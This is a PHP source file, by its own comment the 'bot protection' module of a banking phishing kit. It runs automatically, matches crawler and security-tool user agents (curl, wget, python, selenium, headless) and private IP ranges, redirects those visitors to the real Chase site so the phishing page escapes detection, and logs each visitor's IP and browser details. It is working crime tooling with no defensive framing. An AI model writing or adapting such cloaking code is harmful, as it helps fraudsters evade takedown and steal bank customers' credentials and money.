<?php
// Advanced bot protection for banking phishing kit

class BotProtection {
    private static $bot_signatures = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python',
        'requests', 'urllib', 'httpx', 'aiohttp', 'selenium', 'phantomjs',
        'headless', 'automation', 'test', 'monitor', 'check', 'scan'
    ];
    
    private static $security_ips = [
        '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
        '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.',
        '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.',
        '127.0.0.1', 'localhost'
    ];
    
    public static function isBot() {
        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        
        foreach (self::$bot_signatures as $signature) {
            if (strpos($user_agent, $signature) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    public static function isSecurityIP() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        
        foreach (self::$security_ips as $range) {
            if (strpos($ip, $range) === 0) {
                return true;
            }
        }
        
        return false;
    }
    
    public static function redirectIfSuspicious() {
        if (self::isBot() || self::isSecurityIP()) {
            header('Location: https://www.chase.com');
            exit();
        }
    }
    
    public static function logAccess() {
        $access_log = [
            'timestamp' => date('c'),
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'referer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
            'request_uri' => $_SERVER['REQUEST_URI'] ?? 'unknown',
            'is_bot' => self::isBot(),
            'is_security_ip' => self::isSecurityIP()
        ];
        
        file_put_contents('access_log.json', json_encode($access_log) . "\n", FILE_APPEND | LOCK_EX);
    }
}

// Auto-execute protection
BotProtection::redirectIfSuspicious();
BotProtection::logAccess();
?>